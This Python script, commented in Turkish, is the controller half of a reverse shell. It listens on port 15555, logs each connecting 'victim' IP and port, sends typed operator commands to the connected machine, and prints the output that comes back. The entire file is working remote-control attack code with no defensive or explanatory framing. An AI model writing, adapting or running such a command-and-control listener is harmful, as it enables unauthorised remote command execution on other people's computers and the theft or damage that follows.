import socket
host=""
port=15555
s=socket.socket()

def bagla():
    try:
        s.bind((host,port))
        s.listen(5)  #server a gelen bağlantı isteklerini bir sırada tutuyor bu da sıranın uzunluğunu belirtiyor burada 5 yaptık

    except:
        print("baglantı hatası")
        bagla()

def kabul_et():
    print("Baglantı bekleniyor")
    baglanti,adres=s.accept()
    print("Bağlantı gerçekleşti kurban ip:",adres[0],"kurban port:",adres[1])
    komut_yolla(baglanti)
    baglanti.close() #-----------------> "yukarda,burası" 
    


def komut_yolla(baglanti):
    while True:
        cmd=input("What is your code")
        if cmd=="quit":   #sen quit yazsan "yukarda" server bağlantıyı kopartacak ama client sonsuz döngüde(while True) "veri=s.recv(1024)" veri bekleyecek hep
            baglanti.send("a".encode("utf-8"))
            break 

        if len(cmd)>0:

            baglanti.send(cmd.encode("utf-8"))
            cevap=baglanti.recv(4096).decode("utf-8")
            print(cevap)
            
bagla()
kabul_et()
